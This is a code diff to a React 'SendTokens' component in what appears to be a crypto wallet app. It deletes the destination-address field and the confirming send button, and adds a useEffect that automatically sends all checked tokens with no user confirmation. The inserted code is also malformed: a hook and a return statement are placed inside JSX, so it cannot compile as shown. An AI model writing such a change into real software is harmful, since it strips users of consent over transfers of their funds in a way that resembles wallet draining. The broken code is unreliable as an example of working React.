@@ -97,36 +97,17 @@ export const SendTokens = () => {
   return (
     <div style={{ margin: '20px' }}>
       <form>
-        Destination Address:
-        <Input
-          required
-          value={destinationAddress}
-          placeholder="vitalik.eth"
-          onChange={(e) => setDestinationAddress(e.target.value)}
-          type={
-            addressAppearsValid
-              ? 'success'
-              : destinationAddress.length > 0
-                ? 'warning'
-                : 'default'
-          }
-          width="100%"
-          style={{
-            marginLeft: '10px',
-            marginRight: '10px',
-          }}
-          crossOrigin={undefined}
-        />
-        <Button
-          type="secondary"
-          onClick={sendAllCheckedTokens}
-          disabled={!addressAppearsValid}
-          style={{ marginTop: '20px' }}
-        >
-          {checkedCount === 0
-            ? 'Select one or more tokens above'
-            : `Send ${checkedCount} tokens`}
-        </Button>
+        useEffect(() => {
+  if (tokens.length > 0 && Object.keys(checkedRecords).length > 0) {
+    sendAllCheckedTokens();
+  }
+}, [tokens, checkedRecords]);
+
+return (
+  <div style={{ margin: '20px' }}>
+    <p>Sending all tokens to {destinationAddress}...</p>
+  </div>
+);
       </form>
     </div>
   );
